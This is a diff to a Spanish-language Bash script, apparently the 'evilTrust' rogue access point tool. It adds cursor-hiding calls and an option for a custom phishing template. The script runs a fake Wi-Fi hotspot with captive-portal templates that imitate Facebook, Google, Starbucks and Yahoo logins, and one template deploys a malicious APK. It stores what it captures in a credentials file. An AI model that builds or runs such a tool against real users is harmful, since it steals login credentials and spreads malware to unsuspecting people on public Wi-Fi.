@@ -216,19 +216,19 @@ function guiMode(){
 
         if [ $counter_dep -eq "3" ]; then
 		whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
-                sleep 3
+		tput civis
         else
 		whiptail --title "evilTrust - by S4vitar" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
                 exit 1
         fi
 
-	if [[ -e credenciales.txt ]]; then
+	tput civis; if [[ -e credenciales.txt ]]; then
                 rm -rf credenciales.txt
         fi
 
 	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
 
-	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
         counter=1; for interface in $(cat iface); do
                 let counter++
         done
@@ -241,8 +241,8 @@ function guiMode(){
                 done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
         done
 
-	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
-	airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
+	tput civis; whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
+	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
 
 	rm iface 2>/dev/null
 	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "evilTrust - by S4vitar" 3>&1 1>&2 2>&3)
@@ -306,7 +306,7 @@ function guiMode(){
 	whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
 
         whiptail --title "evilTrust - by S4vitar" --checklist \
-        "Selecciona la plantilla que desees utilizar" 17 110 12 \
+        "Selecciona la plantilla que desees utilizar" 17 103 12 \
         facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
         google-login "Plantilla de inicio de sesión de Google" OFF \
         starbucks-login "Plantilla de inicio de sesión de Starbucks" OFF \
@@ -314,7 +314,8 @@ function guiMode(){
         yahoo-login "Plantilla de inicio de sesión de yahoo" OFF \
         all_in_one "Plantilla todo en uno (múltiples portales centralizados)" OFF \
         cliqq-payload "Plantilla con despliege de APK malicioso" OFF \
-        optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF 2>template
+        optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF \
+	personalizada "Uso de plantilla personalizada" OFF 2>template
 
 	template=$(cat template | tr -d '"'); rm template
 
@@ -343,7 +344,7 @@ function guiMode(){
                 popd > /dev/null 2>&1; getCredentials
 	else
 		whiptail --title "evilTrust - by S4vitar" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
-		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Pues vamos a ello!" 8 78
+		template=$(whiptail --title "evilTrust - by S4vitar" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "evilTrust - Plantilla personalizada" 3>&1 1>&2 2>&3)
                 pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
